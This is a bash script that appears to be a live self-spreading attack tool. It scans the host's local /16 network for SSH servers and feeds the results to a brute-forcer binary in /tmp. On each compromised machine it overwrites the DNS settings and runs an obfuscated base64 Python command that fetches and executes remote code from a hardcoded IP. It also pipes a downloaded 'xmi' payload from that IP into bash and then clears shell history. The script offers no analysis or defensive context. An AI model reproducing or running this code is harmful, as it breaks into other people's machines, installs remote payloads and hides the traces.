#!/bin/bash
#cd /tmp
#rm -rf /tmp/ssh_vuln.log /tmp/ssh_vuln.txt
rand=$(seq 0 255 | sort -R | head -n1)
rand2=$(seq 0 255 | sort -R | head -n1)

if [ -s /usr/bin/ifconfig ];
then
	range=$(ifconfig | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
else
	range=$(ip a | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
fi

if [ ! "$(ps -fe|grep -e '/tmp/hxx\|/tmp/masscan\|/tmp/scan'|grep -v grep)" ];
then
	rm -rf /tmp/sshcheck /tmp/ssh_vuln.txt /tmp/scan.log /tmp/ip192.txt /tmp/ssh_vuln.log
	nohup /tmp/scan $range.0.0-$range.255.255 22 > /tmp/ssh_vuln.txt
	cat /tmp/ssh_vuln.txt | grep "OpenSSH" | awk '{print $1}' | uniq | shuf > /tmp/sshcheck
	nohup /tmp/hxx 300 -f /tmp/sshcheck /tmp/ps 22 'echo "nameserver 8.8.8.8" > /etc/resolv.conf; echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExMy4xNTEvZC5weSIpLnJlYWQoKSkn" | base64 -d | bash -; wget -q -O - http://205.185.113.151/xmi | bash -sh; curl -fsSL http://205.185.113.151/xmi | bash -sh; lwp-download http://205.185.113.151/xmi /tmp/xmi; bash /tmp/xmi; rm -rf /tmp/xmi; history -c' >/dev/null 2>&1
	echo Finished
	pkill -9 hxx
fi